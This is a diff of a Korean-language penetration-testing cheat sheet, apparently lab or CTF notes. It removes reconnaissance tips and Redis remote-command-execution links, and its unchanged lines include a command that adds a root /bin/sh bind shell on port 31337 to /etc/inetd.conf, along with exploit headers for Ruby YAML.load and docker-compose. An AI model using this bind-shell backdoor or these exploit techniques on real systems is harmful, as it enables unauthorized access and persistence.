@@ -1,20 +1,4 @@
-- nmap에서 `-vv`를 붙여서 자세하게 확인하기.
-
 - AD라고 해서 꼭 AD만으로 풀려고 하면 안풀리는 경우가 있다 !
-
-- `config` 파일을 먼저 `find`로 모두 찾아본 뒤에 패스워드 혹은 해시가 적혀 있는지 확인
-
-- password reuse
-
-- `curl` 헤더 확인
-
-- 사이트 제목 및 내용 확인
-
-- `/var/mail`에 있는 내용 확인
-  
-- github에서 `"$pass"`로 pass 변수 찾기
-
-- page source code 확인
 ---
 # Ruby YAML.load exploit
 ```bash
@@ -68,22 +52,6 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 - 31337번 포트로 바인드 셸 연결
 
 ---
-# NMAP
-```bash
-sudo nmap --scrip vuln <ip>
-```
-- 취약점을 찾기 어려울 때 nmap 실행해서 확인
-- /etc/hosts에 등록하고 난 뒤에 nmap 한번 더 실행해주기.
-
-```bash
-sudo nmap -Pn <ip>
-```
-- ping 테스트가 안되더라도 서버가 열려있을 수 있으니 확인
-
-```bash
-sudo nmap -sn 192.168.1.0/24
-```
----
 # FTP
 - `ls -al`로 숨겨진 파일 확인 가능.
 - dir 안될 때 `passive` 입력해서 만들어주기.
@@ -130,17 +98,6 @@ C:/inetpub/wwwroot/web.config
 C:/inetpub/logs/logfiles
 ```
 ---
-# Redis modules execute command
-<img width="811" height="496" alt="image" src="https://github.com/user-attachments/assets/0426a9b3-32af-41ba-9bdf-e3585a712089" />
-
-- https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
-- https://github.com/n0b0dyCN/redis-rogue-server
----
-# redis-cli
-```bash
-redis-cli -h <ip>
-```
----
 # SSH
 - authorized_keys를 변경할 수 있으면 변경
 ---
@@ -168,11 +125,6 @@ set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
 ```
 ```bash
 export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
-```
----
-# docker
-```bash
-docker images
 ```
 ---
 # docker-compose.yaml exploit
